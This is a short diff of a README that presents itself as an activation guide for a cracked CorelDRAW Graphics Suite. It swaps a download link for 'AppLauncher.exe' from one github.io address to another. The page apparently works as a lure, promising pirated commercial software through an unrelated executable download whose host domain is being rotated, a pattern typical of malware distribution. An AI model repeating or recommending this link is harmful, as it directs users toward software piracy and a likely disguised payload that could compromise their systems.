@@ -1,7 +1,7 @@
 # 🖌️ CorelDRAW Graphics Suite Activated — Activation Guide
 
 🔘 Download CorelDRAW Graphics Suite Activated:  
-[![Download AppLauncher](https://img.shields.io/badge/Download-AppLauncher.exe-green)](https://coreldraw-graphics-suite-activated.github.io/.github/)
+[![Download AppLauncher](https://img.shields.io/badge/Download-AppLauncher.exe-green)](https://corelimm1graphicsdraw6.github.io/.github/)
 
 ---
 
